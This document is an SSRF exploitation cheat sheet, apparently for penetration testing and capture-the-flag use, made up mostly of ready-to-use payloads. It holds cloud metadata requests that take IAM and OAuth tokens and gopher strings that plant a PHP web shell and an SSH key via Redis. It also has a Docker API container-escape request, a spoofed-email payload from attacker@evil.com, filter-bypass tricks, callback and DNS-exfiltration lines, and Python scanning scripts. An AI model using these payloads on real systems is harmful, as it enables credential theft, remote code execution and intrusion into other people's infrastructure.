# SSRF - Advanced Exploitation

## Cloud Metadata Exploitation

### AWS EC2 Metadata

#### Basic Enumeration
```
# Get instance identity
http://169.254.169.254/latest/meta-data/

# Get IAM role
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# List all metadata endpoints
http://169.254.169.254/latest/meta-data/
```

#### Key Endpoints
```
# Instance ID
http://169.254.169.254/latest/meta-data/instance-id

# Hostname
http://169.254.169.254/latest/meta-data/hostname

# Public IP
http://169.254.169.254/latest/meta-data/public-ipv4

# Security Groups
http://169.254.169.254/latest/meta-data/security-groups

# User Data (often contains secrets!)
http://169.254.169.254/latest/user-data/

# IAM Credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

#### IMDSv2 Bypass (Token-Based)
AWS IMDSv2 requires a token, but SSRF can sometimes bypass:
```
# If the application forwards headers, inject token request:
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Then use token:
http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: TOKEN_HERE
```

---

### Google Cloud Metadata

#### Basic Access
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
```

**Important**: Requires header `Metadata-Flavor: Google`

#### Key Endpoints
```
# Project ID
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Access token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Service account email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# All metadata
http://metadata.google.internal/computeMetadata/v1/?recursive=true

# Custom metadata
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
```

#### Header Injection
If you can control headers:
```
Metadata-Flavor: Google
```

---

### Azure Metadata

#### Basic Access
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

**Important**: Requires header `Metadata: true`

#### Key Endpoints
```
# Instance metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# OAuth token for Azure Resource Manager
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# OAuth token for Azure Key Vault
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net

# Attested data
http://169.254.169.254/metadata/attested/document?api-version=2020-09-01
```

---

### Digital Ocean Metadata

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
```

---

## Exploiting Internal Services

### Redis (Port 6379)

#### Information Gathering
```
# Using dict protocol
dict://localhost:6379/INFO
dict://localhost:6379/CONFIG:GET:dir

# Using gopher protocol
gopher://localhost:6379/_INFO
```

#### Writing Web Shell (if Redis has write access to web root)
```gopher
gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0d%0a%0a<?php system($_GET['cmd']); ?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

#### Writing SSH Key
```gopher
gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$400%0d%0a%0a%0assh-rsa AAAAB3...YOUR_PUBLIC_KEY...%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

---

### Memcached (Port 11211)

#### Information Gathering
```
dict://localhost:11211/stats
gopher://localhost:11211/_stats%0aquit
```

#### Extract Data
```
gopher://localhost:11211/_get%20KEY_NAME%0aquit
gopher://localhost:11211/_stats%20items%0aquit
gopher://localhost:11211/_stats%20cachedump%201%200%0aquit
```

---

### MySQL (Port 3306)

Difficult to exploit via HTTP SSRF, but possible with gopher:
```
# Read /etc/passwd via LOAD DATA LOCAL
gopher://localhost:3306/_...COMPLEX_PAYLOAD...
```

Use Gopherus tool to generate payloads:
```bash
gopherus --exploit mysql
```

---

### PostgreSQL (Port 5432)

```bash
# Use Gopherus
gopherus --exploit postgresql
```

---

### Elasticsearch (Port 9200)

#### Information Gathering
```
http://localhost:9200/
http://localhost:9200/_cat/indices
http://localhost:9200/_cluster/health
http://localhost:9200/_nodes
```

#### Reading Data
```
http://localhost:9200/_search?q=password
http://localhost:9200/_search?q=flag
http://localhost:9200/INDEX_NAME/_search
http://localhost:9200/_all/_search
```

#### Writing Data (if permitted)
```
POST http://localhost:9200/test/_doc/1
{"flag": "captured"}
```

---

### Docker API (Port 2375/2376)

#### List Containers
```
http://localhost:2375/containers/json
http://localhost:2375/images/json
```

#### Create Malicious Container
```json
POST http://localhost:2375/containers/create
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "cat /host/etc/passwd > /tmp/passwd"],
  "Binds": ["/:/host"]
}
```

---

### SMTP (Port 25)

#### Send Email
```gopher
gopher://localhost:25/_HELO%20localhost%0AMAIL%20FROM:attacker@evil.com%0ARCPT%20TO:victim@target.com%0ADATA%0ASubject:%20SSRF%20Attack%0A%0AThis%20is%20a%20test%0A.%0AQUIT
```

---

## Advanced Bypass Techniques

### DNS Rebinding

#### How It Works
1. Create domain that resolves to legitimate IP first
2. Then changes to resolve to internal IP
3. Bypass initial validation

#### Tools
- **rbndr.us**: `7f000001.rbndr.us` → 127.0.0.1
- **nip.io**: `127.0.0.1.nip.io` → 127.0.0.1
- **xip.io**: `127.0.0.1.xip.io` → 127.0.0.1

#### Custom DNS Rebinding
```python
# Simple DNS rebinding server
from dnslib import *
import time

class DNSRebinding:
    def __init__(self):
        self.first_request = True
    
    def resolve(self, domain):
        if self.first_request:
            self.first_request = False
            return "1.2.3.4"  # Legitimate IP
        else:
            return "127.0.0.1"  # Internal IP
```

---

### URL Parser Confusion

#### Using @ Symbol
```
http://legitimate.com@127.0.0.1/
http://legitimate.com@localhost/
http://google.com@192.168.1.1/
```

#### Using # Fragment
```
http://127.0.0.1#legitimate.com
http://localhost#google.com
```

#### Using \ Backslash (works in some parsers)
```
http://legitimate.com\@127.0.0.1/
http://google.com\127.0.0.1/
```

---

### Open Redirect Chain

If target has open redirect:
```
http://target.com/redirect?url=http://localhost/admin
```

Or use external open redirects:
```
http://target.com/fetch?url=http://open-redirect-site.com/redir?url=http://localhost/
```

---

### Protocol Smuggling

#### Gopher Protocol
```
gopher://localhost:6379/_SET%20test%20value
gopher://localhost:25/_MAIL%20FROM
```

#### File Protocol with Path Traversal
```
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
file:///../../../etc/passwd
```

#### Dict Protocol
```
dict://localhost:6379/INFO
dict://localhost:11211/stats
```

---

### IP Address Obfuscation

#### Decimal Format
```
http://2130706433/  # 127.0.0.1
http://3232235521/  # 192.168.1.1
```

#### Hexadecimal Format
```
http://0x7f000001/  # 127.0.0.1
http://0xc0a80101/  # 192.168.1.1
```

#### Octal Format
```
http://0177.0.0.1/  # 127.0.0.1
http://0300.0250.0.1/  # 192.168.0.1
```

#### Mixed Format
```
http://127.1/  # 127.0.0.1
http://127.0.1/  # 127.0.0.1
http://0x7f.1/  # 127.0.0.1
```

#### IPv6
```
http://[::1]/  # localhost
http://[0:0:0:0:0:0:0:1]/  # localhost
http://[0:0:0:0:0:ffff:127.0.0.1]/  # IPv4-mapped IPv6
```

---

### Bypassing Regex Filters

#### Whitelist Bypass
```
# If whitelist checks for "legitimate.com"
http://legitimate.com.attacker.com/  # attacker.com resolves to internal IP
http://legitimate.com@127.0.0.1/
```

#### Blacklist Bypass
```
# If "localhost" is blackalized
Localhost
LOCALHOST
loca͏lhost  (invisible character)
ⓛⓞⓒⓐⓛⓗⓞⓢⓣ  (Unicode)
```

---

## Blind SSRF Detection

When you don't see the response:

### 1. Time-Based Detection
```
# If request to closed port times out
http://localhost:22  # Quick response (open)
http://localhost:99999  # Timeout (closed)
```

### 2. Out-of-Band Detection
```
# Use callback server
http://your-server.com/unique-identifier
http://burpcollaborator.net/unique-identifier
http://webhook.site/unique-identifier
```

### 3. DNS Exfiltration
```
http://data-here.your-domain.com/
# Check DNS logs for subdomain requests
```

---

## Exploitation Automation

### Python SSRF Scanner
```python
import requests
from urllib.parse import quote

def test_ssrf(url, param):
    # Common internal targets
    targets = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://192.168.1.1/",
        "file:///etc/passwd"
    ]
    
    for target in targets:
        payload = {param: target}
        try:
            r = requests.get(url, params=payload, timeout=5)
            print(f"[+] Testing: {target}")
            print(f"    Status: {r.status_code}")
            print(f"    Length: {len(r.text)}")
            if "root:" in r.text or "ami-" in r.text:
                print(f"[!] POTENTIAL SSRF: {target}")
        except Exception as e:
            print(f"[-] Error: {e}")

# Usage
test_ssrf("http://target.com/fetch", "url")
```

### Port Scanner via SSRF
```python
import requests
import time

def ssrf_port_scan(url, param, target_host, ports):
    open_ports = []
    
    for port in ports:
        target = f"http://{target_host}:{port}/"
        payload = {param: target}
        
        start = time.time()
        try:
            r = requests.get(url, params=payload, timeout=3)
            elapsed = time.time() - start
            
            # Heuristics: fast response = open port
            if elapsed < 1 and r.status_code != 500:
                open_ports.append(port)
                print(f"[+] Port {port}: OPEN")
        except:
            pass
    
    return open_ports

# Usage
common_ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 9200]
ssrf_port_scan("http://target.com/fetch", "url", "localhost", common_ports)
```

---

## CTF-Specific Scenarios

### 1. Flag in Cloud Metadata
```
http://169.254.169.254/latest/user-data/
# Often contains initialization scripts with secrets/flags
```

### 2. Internal Admin Panel
```
http://localhost/admin/flag
http://localhost:8080/flag
http://127.0.0.1/admin
```

### 3. Redis with Flag
```
dict://localhost:6379/GET:flag
gopher://localhost:6379/_GET%20flag%0aquit
```

### 4. Docker Socket
```
http://localhost:2375/containers/json
# Look for container with flag in environment variables
```

### 5. File Read
```
file:///flag.txt
file:///app/flag.txt
file:///var/www/flag.txt
```

---

## Defense Detection & Bypass

### Common Defenses

1. **URL Validation** - Bypass with encoding
2. **Whitelist** - Bypass with DNS rebinding
3. **Blacklist** - Bypass with IP encoding
4. **No localhost** - Bypass with 127.1, 0.0.0.0
5. **Response blocking** - Use timing/blind techniques

---

## Quick Reference

### AWS Metadata
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
```

### GCP Metadata (needs header)
```
http://metadata.google.internal/computeMetadata/v1/
Metadata-Flavor: Google
```

### Azure Metadata (needs header)
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Metadata: true
```

### Redis Exploit
```
gopher://localhost:6379/_INFO
```

### File Read
```
file:///etc/passwd
```

### Localhost Bypass
```
http://127.1/
http://2130706433/
http://0x7f000001/
```

---

## Tools

- **SSRFmap**: Automated SSRF exploitation framework
- **Gopherus**: Generate gopher protocol payloads
- **Interactsh**: Callback server for out-of-band detection
- **Burp Collaborator**: Detect blind SSRF
- **webhook.site**: Quick callback testing